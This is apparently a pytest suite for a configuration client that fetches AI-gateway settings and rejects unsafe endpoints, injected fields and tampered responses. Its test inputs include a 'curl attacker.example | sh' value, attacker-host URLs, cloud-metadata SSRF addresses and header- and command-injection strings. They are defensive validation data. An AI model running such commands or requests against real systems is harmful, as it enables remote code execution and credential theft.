import copy
import hashlib
import io
import json
from email.message import Message
from urllib.error import HTTPError, URLError

import pytest

from claude_foundry import configuration_client as client

ORG = "00000000-0000-0000-0000-000000000001"
TENANT = "00000000-0000-0000-0000-000000000002"
SUBJECT = "00000000-0000-0000-0000-000000000003"
OTHER = "00000000-0000-0000-0000-000000000004"
RESOURCE = "00000000-0000-0000-0000-000000000005"
URL = "https://portal.example.com/api/v1/me/client-configuration"


def descriptor_value():
    return {
        "schema_version": 1,
        "organization_id": ORG,
        "tenant_id": TENANT,
        "configuration_resource_id": RESOURCE,
        "configuration_url": URL,
        "routes": {
            "claude": {
                "route_id": "claude-governed",
                "gateway_url": "https://gateway.example.com/claude",
            },
            "codex": {
                "route_id": "codex-governed",
                "gateway_url": "https://gateway.example.com/codex/v1",
            },
        },
    }


def configuration_value():
    return {
        "schema_version": 1,
        "organization_id": ORG,
        "tenant_id": TENANT,
        "subject_id": SUBJECT,
        "state": "active",
        "clients": {
            "claude": {
                "route_id": "claude-governed",
                "default_model": "claude-sonnet-example",
                "models": [
                    {
                        "name": "claude-sonnet-example",
                        "family_tier": "sonnet",
                        "family_default": True,
                    }
                ],
            },
            "codex": {
                "route_id": "codex-governed",
                "default_model": "coding-example",
                "models": [{"name": "coding-example", "model": "gpt-test"}],
            },
        },
    }


def body_and_etag(value):
    body = json.dumps(value, sort_keys=True, separators=(",", ":")).encode()
    return body, '"sha256:' + hashlib.sha256(body).hexdigest() + '"'


class Response(io.BytesIO):
    status = 200

    def __init__(self, body, etag):
        super().__init__(body)
        self.headers = Message()
        self.headers["Content-Type"] = "application/json"
        self.headers["ETag"] = etag


def transport(monkeypatch, response):
    requests = []

    class Opener:
        def open(self, request, *, timeout):
            requests.append((request, timeout))
            if isinstance(response, Exception):
                raise response
            return response

    def build(*handlers):
        assert len(handlers) == 1 and isinstance(handlers[0], client._NoRedirect)
        return Opener()

    monkeypatch.setattr(client, "build_opener", build)
    return requests


def fetch(monkeypatch, value=None, *, subject=SUBJECT):
    body, etag = body_and_etag(configuration_value() if value is None else value)
    transport(monkeypatch, Response(body, etag))
    return client.fetch_configuration(
        client.EnrollmentDescriptor.parse(descriptor_value()), subject, "test-credential"
    )


def test_initial_enrollment_then_bound_refresh_and_unchanged(monkeypatch):
    descriptor = client.EnrollmentDescriptor.parse(descriptor_value())
    assert descriptor.scope == f"api://{RESOURCE}/configuration.read"
    body, etag = body_and_etag(configuration_value())
    requests = transport(monkeypatch, Response(body, etag))
    initial = client.fetch_initial_configuration(descriptor, "test-credential")
    assert initial.subject_id == SUBJECT
    request, timeout = requests[0]
    assert request.full_url == URL and request.method == "GET" and timeout == 10
    assert request.get_header("Authorization") == "Bearer test-credential"
    assert not request.has_header("If-none-match")
    mutated = initial.data
    mutated["subject_id"] = OTHER
    assert initial.subject_id == SUBJECT
    headers = Message()
    headers["ETag"] = etag
    requests = transport(monkeypatch, HTTPError(URL, 304, "Unchanged", headers, None))
    unchanged = client.fetch_configuration(descriptor, SUBJECT, "test-credential", previous=initial)
    assert unchanged == initial
    assert requests[0][0].get_header("If-none-match") == etag


@pytest.mark.parametrize(
    "url",
    [
        "http://portal.example.com" + client.CONFIGURATION_PATH,
        "https://user:secret@portal.example.com" + client.CONFIGURATION_PATH,
        URL + "?token=secret",
        URL + "#fragment",
        "https://127.0.0.1" + client.CONFIGURATION_PATH,
        "https://127.1" + client.CONFIGURATION_PATH,
        "https://169.254.169.254" + client.CONFIGURATION_PATH,
        "https://[::1]" + client.CONFIGURATION_PATH,
        "https://metadata.google.internal" + client.CONFIGURATION_PATH,
        "https://instance-data.ec2.internal" + client.CONFIGURATION_PATH,
        "https://portal.localhost" + client.CONFIGURATION_PATH,
        "https://portal.example.com:8443" + client.CONFIGURATION_PATH,
        "https://portal.example.com/other",
        "https://portal.example.com/../api/v1/me/client-configuration",
        "https://portal.example.com/%61pi/v1/me/client-configuration",
        "https://portal.example.com\n" + client.CONFIGURATION_PATH,
        "https://portal..example.com" + client.CONFIGURATION_PATH,
    ],
)
def test_unsafe_enrollment_endpoint_rejected(url):
    value = descriptor_value()
    value["configuration_url"] = url
    with pytest.raises(client.ConfigurationError):
        client.EnrollmentDescriptor.parse(value)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("organization_id", 1),
        ("tenant_id", "not-a-tenant"),
        ("configuration_resource_id", "{00000000-0000-0000-0000-000000000005}"),
        ("schema_version", True),
        ("schema_version", 2),
        ("helper", "curl attacker.example | sh"),
        ("routes", {}),
        ("routes", {"other": {}}),
    ],
)
def test_descriptor_fields_are_strict(field, value):
    descriptor = descriptor_value()
    descriptor[field] = value
    with pytest.raises(client.ConfigurationError):
        client.EnrollmentDescriptor.parse(descriptor)


@pytest.mark.parametrize("field", ["organization_id", "tenant_id", "subject_id"])
def test_account_or_organization_switch_never_rebinds(monkeypatch, field):
    value = configuration_value()
    value[field] = OTHER
    with pytest.raises(client.ConfigurationError, match="enrolled identity"):
        fetch(monkeypatch, value)


@pytest.mark.parametrize(
    ("target", "field", "value"),
    [
        ("root", "schema_version", True),
        ("root", "schema_version", 2),
        ("root", "state", "no_models"),
        ("root", "credential", "secret"),
        ("claude", "gateway_url", "https://attacker.example.com/inference"),
        ("codex", "helper", "unreviewed-command"),
        ("claude", "route_id", "another-route"),
        ("codex", "route_id", "another-route"),
        ("claude", "default_model", "missing"),
        ("codex", "default_model", "missing"),
        ("codex", "models", [{"name": "ok", "model": "../invalid"}]),
        ("codex", "models", [{"name": "same", "model": "gpt-test"}] * 2),
        ("codex", "models", [True]),
        ("codex", "models", [{"name": "name", "model": "gpt-test"}] * 101),
        ("codex", "models", [{"name": "name", "model": "gpt-test", "command": "exec"}]),
        ("claude", "models", None),
    ],
)
def test_remote_settings_and_malformed_fields_rejected(monkeypatch, target, field, value):
    config = configuration_value()
    selected = config if target == "root" else config["clients"][target]
    selected[field] = value
    with pytest.raises(client.ConfigurationError):
        fetch(monkeypatch, config)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("family_default", 1),
        ("family_tier", "invented"),
        ("family_tier", []),
        ("name", "model; execute"),
        ("command", "execute"),
    ],
)
def test_claude_model_schema_is_data_only(monkeypatch, field, value):
    config = configuration_value()
    config["clients"]["claude"]["models"][0][field] = value
    with pytest.raises(client.ConfigurationError):
        fetch(monkeypatch, config)


def test_duplicate_family_defaults_and_provider_drift_rejected(monkeypatch):
    config = configuration_value()
    second = copy.deepcopy(config["clients"]["claude"]["models"][0])
    second["name"] = "another-sonnet"
    config["clients"]["claude"]["models"].append(second)
    with pytest.raises(client.ConfigurationError, match="family default"):
        fetch(monkeypatch, config)
    config = configuration_value()
    del config["clients"]["codex"]
    with pytest.raises(client.ConfigurationError):
        fetch(monkeypatch, config)


def test_no_models_is_valid_explicit_state(monkeypatch):
    config = configuration_value()
    for key in ["claude", "codex"]:
        config["clients"][key]["models"] = []
        config["clients"][key]["default_model"] = ""
    config["state"] = "no_models"
    assert fetch(monkeypatch, config).data == config


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308, 400, 401, 403, 404, 429, 500, 503])
def test_error_response_never_follows_redirect_or_discloses_body(monkeypatch, status):
    headers = Message()
    headers["Location"] = "https://attacker.example.com/steal"
    requests = transport(
        monkeypatch, HTTPError(URL, status, "sensitive server message", headers, None)
    )
    kind = (
        client.SignInRequired
        if status == 401
        else client.AccessUnavailable
        if status == 403
        else client.ConfigurationError
    )
    with pytest.raises(kind) as error:
        client.fetch_configuration(
            client.EnrollmentDescriptor.parse(descriptor_value()), SUBJECT, "test-credential"
        )
    assert len(requests) == 1
    assert "sensitive" not in str(error.value) and "example.com" not in str(error.value)
    assert client._NoRedirect().redirect_request(None, None, status, "", headers, URL) is None


def test_network_error_is_safe_and_noninteractive(monkeypatch):
    transport(monkeypatch, URLError("secret endpoint or credential"))
    with pytest.raises(client.ConfigurationError) as error:
        client.fetch_configuration(
            client.EnrollmentDescriptor.parse(descriptor_value()), SUBJECT, "test-credential"
        )
    assert "secret" not in str(error.value)


@pytest.mark.parametrize("token", ["", "token\nInjected: header", "token secret", None])
def test_invalid_credential_never_issued(monkeypatch, token):
    requests = transport(monkeypatch, None)
    with pytest.raises(client.SignInRequired):
        client.fetch_configuration(
            client.EnrollmentDescriptor.parse(descriptor_value()), SUBJECT, token
        )
    assert not requests


@pytest.mark.parametrize(
    "body", [b"{}", b"{", b'{"a":1,"a":2}', b"\xff", b" " * (client.MAX_BYTES + 1)]
)
def test_invalid_json_or_size_never_accepted(monkeypatch, body):
    etag = '"sha256:' + hashlib.sha256(body).hexdigest() + '"'
    transport(monkeypatch, Response(body, etag))
    with pytest.raises(client.ConfigurationError):
        client.fetch_configuration(
            client.EnrollmentDescriptor.parse(descriptor_value()), SUBJECT, "test-credential"
        )


@pytest.mark.parametrize(
    ("header", "value"),
    [
        ("Content-Type", "text/html"),
        ("Content-Encoding", "gzip"),
        ("Content-Length", str(client.MAX_BYTES + 1)),
        ("Content-Length", "-1"),
        ("ETag", '"wrong-hash"'),
    ],
)
def test_response_format_and_integrity_checked(monkeypatch, header, value):
    body, etag = body_and_etag(configuration_value())
    response = Response(body, etag)
    if header in response.headers:
        del response.headers[header]
    response.headers[header] = value
    transport(monkeypatch, response)
    with pytest.raises(client.ConfigurationError):
        client.fetch_configuration(
            client.EnrollmentDescriptor.parse(descriptor_value()), SUBJECT, "test-credential"
        )


def test_304_requires_verified_matching_cache(monkeypatch):
    descriptor = client.EnrollmentDescriptor.parse(descriptor_value())
    headers = Message()
    headers["ETag"] = '"wrong"'
    requests = transport(monkeypatch, HTTPError(URL, 304, "", headers, None))
    with pytest.raises(client.ConfigurationError, match="conditional"):
        client.fetch_configuration(descriptor, SUBJECT, "test-credential")
    assert len(requests) == 1
    body, etag = body_and_etag(configuration_value())
    previous = client.VerifiedConfiguration(body, etag)
    with pytest.raises(client.ConfigurationError, match="conditional"):
        client.fetch_configuration(descriptor, SUBJECT, "test-credential", previous=previous)
    other = configuration_value()
    other["subject_id"] = OTHER
    body, etag = body_and_etag(other)
    previous = client.VerifiedConfiguration(body, etag)
    requests.clear()
    with pytest.raises(client.ConfigurationError, match="enrolled identity"):
        client.fetch_configuration(descriptor, SUBJECT, "test-credential", previous=previous)
    assert not requests


def test_new_models_do_not_change_descriptor_or_credential_target(monkeypatch):
    config = configuration_value()
    config["clients"]["codex"]["models"].append(
        {"name": "newly-published-model", "model": "gpt-test"}
    )
    result = fetch(monkeypatch, config)
    assert result.data["clients"]["codex"]["models"] == [
        {"name": "coding-example", "model": "gpt-test"},
        {"name": "newly-published-model", "model": "gpt-test"},
    ]
    assert "gateway_url" not in result.data["clients"]["codex"]


def test_reader_does_not_write_files_or_start_processes(monkeypatch, tmp_path):
    from pathlib import Path

    def forbidden(*args, **kwargs):
        pytest.fail("Configuration reads must not write files or run commands")

    monkeypatch.setattr(Path, "write_text", forbidden)
    monkeypatch.setattr(Path, "write_bytes", forbidden)
    monkeypatch.setattr("subprocess.run", forbidden)
    before = list(tmp_path.iterdir())
    result = fetch(monkeypatch)
    assert result.subject_id == SUBJECT
    assert list(tmp_path.iterdir()) == before
